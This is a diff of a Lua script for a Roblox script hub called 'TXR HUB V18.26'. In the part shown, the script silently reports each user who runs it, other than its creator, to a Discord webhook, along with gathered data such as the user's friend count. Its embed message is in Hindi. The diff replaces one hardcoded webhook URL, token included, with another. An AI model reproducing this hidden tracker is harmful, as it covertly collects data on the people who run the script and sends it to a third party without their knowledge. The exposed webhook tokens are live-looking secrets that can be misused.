@@ -91,7 +91,7 @@ task.spawn(function()
     if lp.UserId == CREATOR_USER_ID then return end
     
     pcall(function()
-        local WEBHOOK_URL = "https://discord.com/api/webhooks/1541474593741734038/OQ4sGq5o_U8xhbYhhp6uLC1fVFVFwjVaaxR0KLqxFOhmLvIfaiT8dP7VZnoyuFgOq3Jo"
+        local WEBHOOK_URL = "https://discord.com/api/webhooks/1541722782310604820/L3kjYivqBHkOtU5HZJj7pNFJGyHkBHBaVZPg0AY-QBAJFf_SG3cu8TEcMaRjUuRTiyD1"
         local TRACKER_FILE = "TXR_Tracker_Data.json"
         
         local trackerData = {
@@ -124,7 +124,6 @@ task.spawn(function()
         
         local friendCount = "N/A"
         pcall(function()
-            local friendPages = Players:GetFriendsOnline(lp.UserId)
             local pages = Players:GetFriendsAsync(lp.UserId)
             local count = 0
             while true do
@@ -160,7 +159,7 @@ task.spawn(function()
             ["embeds"] = {
                 {
                     ["title"] = "🚨 TXR HUB EXECUTED BY A USER 🚨",
-                    ["description"] = "Ek naye user ne **TXR HUB V18.26** load kiya hai. Poori information niche di gayi hai:",
+                    ["description"] = "Ek user ne **TXR HUB V18.26** load kiya hai. Poori information niche di gayi hai:",
                     ["color"] = 65535,
                     ["fields"] = {
                         {
